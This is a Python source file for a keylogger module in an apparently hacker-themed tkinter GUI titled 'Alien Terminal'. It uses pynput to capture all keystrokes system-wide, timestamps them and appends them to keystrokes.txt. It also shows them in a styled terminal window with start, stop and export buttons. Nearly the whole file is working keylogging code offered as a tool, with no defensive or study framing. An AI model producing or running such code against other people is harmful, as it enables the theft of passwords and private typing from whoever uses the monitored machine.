import random
import tkinter as tk
from pynput import keyboard
from datetime import datetime
import threading
from tkinter import scrolledtext, messagebox
from utils import export_to_txt

# Global flag to stop the keylogger
keylogger_active = True

def on_press(key, output_box):
    try:
        if keylogger_active:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            keystroke = f"{timestamp} - {key.char}\n"
            with open("keystrokes.txt", "a", encoding="utf-8") as f:
                f.write(keystroke)
            output_box.config(state=tk.NORMAL)
            output_box.insert(tk.END, keystroke)
            output_box.config(state=tk.DISABLED)
            output_box.yview(tk.END)
    except AttributeError:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        keystroke = f"{timestamp} - {str(key)}\n"
        with open("keystrokes.txt", "a", encoding="utf-8") as f:
            f.write(keystroke)
        output_box.config(state=tk.NORMAL)
        output_box.insert(tk.END, keystroke)
        output_box.config(state=tk.DISABLED)
        output_box.yview(tk.END)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger(output_box):
    with keyboard.Listener(on_press=lambda key: on_press(key, output_box), on_release=on_release) as listener:
        listener.join()

def stop_keylogger():
    global keylogger_active
    keylogger_active = False

def open_keylogger_window():
    keylogger_window = tk.Toplevel()
    keylogger_window.title("Alien Terminal - Keylogger Module")
    keylogger_window.geometry("1024x768")
    keylogger_window.configure(bg="#000800")
    keylogger_window.resizable(False, False)

    canvas = tk.Canvas(keylogger_window, bg="#000800", highlightthickness=0)
    canvas.pack(fill=tk.BOTH, expand=True)

    # Scanlines
    for y in range(0, 768, 4):
        canvas.create_line(0, y, 1024, y, fill="#002200")

    # Title with flicker
    title_label = tk.Label(
        keylogger_window,
        text=">> KEYLOGGER MODULE <<",
        font=("Courier New", 16, "bold"),
        fg="#33FF00",
        bg="#000800"
    )
    title_label.place(x=370, y=30)

    def flicker_title():
        title_label.config(fg=random.choice(["#33FF00", "#000800"]))
        keylogger_window.after(150, flicker_title)

    flicker_title()

    output_box = scrolledtext.ScrolledText(
        keylogger_window, height=20, width=100, state=tk.DISABLED,
        bg="#000000", fg="#33FF00", insertbackground="#33FF00",
        font=("Courier", 10), borderwidth=0,
        highlightbackground="#33FF00", highlightcolor="#33FF00"
    )
    output_box.place(x=60, y=100)

    # Button styling
    button_style = {
        "bg": "#001100",
        "fg": "#33FF00",
        "activebackground": "#003300",
        "activeforeground": "#99ff99",
        "font": ("Courier New", 12, "bold"),
        "width": 22,
        "relief": "flat"
    }

    def start_keylogger_thread():
        output_box.config(state=tk.NORMAL)
        output_box.insert(tk.END, "[*] Starting keylogger...\n")
        output_box.config(state=tk.DISABLED)

        global keylogger_active
        keylogger_active = True

        threading.Thread(target=start_keylogger, args=(output_box,), daemon=True).start()

    def stop_keylogger_thread():
        output_box.config(state=tk.NORMAL)
        output_box.insert(tk.END, "[*] Stopping keylogger...\n")
        output_box.config(state=tk.DISABLED)
        stop_keylogger()

    # Buttons
    tk.Button(keylogger_window, text="Start Keylogger", command=start_keylogger_thread, **button_style).place(x=400, y=560)
    tk.Button(keylogger_window, text="Stop Keylogger", command=stop_keylogger_thread, **button_style).place(x=400, y=600)
    tk.Button(keylogger_window, text="Export to TXT", command=lambda: export_to_txt(output_box, parent=keylogger_window), **button_style).place(x=400, y=640)
